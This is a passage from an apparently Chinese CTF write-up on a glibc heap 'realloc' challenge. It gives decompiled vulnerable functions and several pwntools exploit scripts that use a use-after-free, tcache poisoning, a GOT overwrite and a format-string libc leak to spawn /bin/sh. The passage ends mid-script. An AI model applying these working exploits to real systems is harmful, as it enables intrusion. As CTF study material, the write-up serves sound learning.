class="line"></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(p32(system)+<span class="string">&quot;;/bin/sh\x00&quot;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="relloc"><a href="#relloc" class="headerlink" title="relloc"></a>relloc</h2><p>​    全程使用realloc函数进行堆的申请和释放，下面是realloc函数的特性</p>
<ul>
<li>当<code>size</code>为0，就等于<code>free()</code>函数，同时返回值为NULL</li>
<li>当指针为0，<code>size</code>大于0，就等于<code>malloc()</code>函数</li>
<li><code>size</code>小于等于原来的<code>size</code>，则在原堆块上缩小，多余的大小<code>free()</code>掉</li>
<li><code>size</code>大于原来的<code>size</code>，如果<code>bin</code>中有多余的堆块就进行扩充，没有多余的堆块则重新分配新的堆块，并将内容复制到新的堆块中，然后再将原来的堆块<code>free()</code>掉</li>
</ul>
<h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>在reallocate的时候只限制的最大值，没有限制最小值，所以可以输入0造成ufa.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reallocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> || !heap[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">realloc</span>((<span class="keyword">void</span> *)heap[v1], size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">  heap[v1] = v3;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read_input(heap[v1], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><p>这个函数没有show功能，所以本来计划是拿ufa打stdout，打也打成功了，libc地址也拿到了，但是heap[0]这个指针算费了，因为realloc函数会对传进来的指针进行检查，如果不是堆上的地址就会报错退出，heap[0]已经指向了stdout了，后续没法再使用heap[0],最可恶的是这个程序只能有两个指针，剩下的一个指正根本没办法申请到别的地方，我是做不到，虽然没做出来，但还是把脚本放出来，因为在打stdout的时候还利用了malloc_consolidate，利用scanf申请一个largebin大小的堆，然后就会触发malloc_consolidate合并fastbin相邻的堆块放到smallbin上面，算是一个小知识点。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">scanf_got=elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line">scanf_addr=libc.sym[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_addr=libc.sym[<span class="string">&#x27;atoll&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(scanf_addr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ufa</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x401429&#x27;)</span></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        ufa(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        realloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">    ufa(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x600</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">&#x27;\x58\xe7&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    payload=p64(<span class="number">0</span>)+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    <span class="comment">#payload=p64(0)*3</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free</span><br><span class="line">    </span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    ufa(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x48</span>,p64(scanf_got)+p64(<span class="number">0</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>这个利用方法不行那就换种利用方法，既然能任意地址申请那就直接申请到got表上面进行爆破system地址完成getshell,我采用atoll的got表项，因为atoll的偏移和system偏移很像</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system:0x4f550</span><br><span class="line">atoll: 0x407d0</span><br></pre></td></tr></table></figure>

<p>只要libc的倒数第四个16进制数是0.那这两个地址前面都一样，就最后两个字节不一样，而且system的最后两个字节是\x50\xf5，但经过验证发现跑不通，源于以下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        heap[v2] = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size));</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">  <span class="function">__int64 __fastcall <span class="title">read_input</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(result) = __read_chk(<span class="number">0LL</span>, a1, a2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((<span class="keyword">int</span>)result - <span class="number">1LL</span> + a1) == <span class="number">10</span> )</span><br><span class="line">    *(_BYTE *)((<span class="keyword">int</span>)result - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个off by null,这就意味着要改got表的话，倒数第五个16进制数和倒数第6个十六进制数会被覆盖成0，本来值覆盖两个字节的，结果覆盖了3个，system的地址是有可能会这样，但几率太小了，16 * 16 * 16的几率</p>
<h4 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h4><p>这是我走投无路看别人的wp知道的，不得不说真的很巧妙，漏洞利用是门艺术我觉得在这道题上就有所体现👍👍，我也知道他为啥只有三百多解了，我头一次见用got表利用格式化字符串泄露libc基地址，也更加理解了realloc,不得不说realloc真的很怪，假如ptr是第一个参数，n是第二个参数，当ptr存在，n大于ptr的size的时候，竟然不从tcache上面找合适的链表，而是从topchunk上面重新分配，当ptr不存在，n大于0的时候才相当于一般的malloc,最恶心的机制是还是他会会对ptr进行检查🤢🤢。</p>
<p>大致思路就是先往teache的两个不同size的链表上上atoll_got,然后申请一个改atoll_got为printf_plt,然后格式化字符串泄露基地址，再把另一个atol_got申请到，改成system，输入’/bin/sh\x00’来getshell.最难的是第一步，下面是实现第一步的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ufa(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x10</span>,p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ufa(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">上面的<span class="number">0</span>和<span class="number">1</span>始终紧邻topchunk,这样就可以改变<span class="number">0</span>和<span class="number">1</span>对应堆的大小又不至于使其被free掉，改变了size后再free的话就可以使刚才链表的第一个堆还是atoll_got,这样重复两次就可以了。</span><br></pre></td></tr></table></figure>

<p>先利用0x30链表上的got改成printf_plt,然后再利用0x10改成system,注意顺序不能乱，因为第一次后atoll就成pritnf,当第二次执行atoll得到idx和size的时候数值是函数的返回值，这时候printf的返回值就被当成了idx和size,printf的返回值是输出的格式化字符的个数，要想第二次idx=1,size&lt;=0x10,printf输出的字符串个数就得等于1和小于等于0x10，下面是代码实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>下面是处理size的函数代码，可见printf最多输出24个字符,0x30&gt;24,所以不行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">read_long</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __read_chk(<span class="number">0LL</span>, nptr, <span class="number">16LL</span>, <span class="number">17LL</span>);</span><br><span class="line">  <span class="keyword">return</span> atoll(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是最终脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoll_got=elf.got[<span class="string">&#x27;atoll&#x27;</span>]</span><br><span class="line">print_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ufa</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x4014D0&#x27;)</span></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    ufa(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x10</span>,p64(atoll_got))</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    ufa(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(atoll_got))</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(print_plt))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)-<span class="number">0x3ec760</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    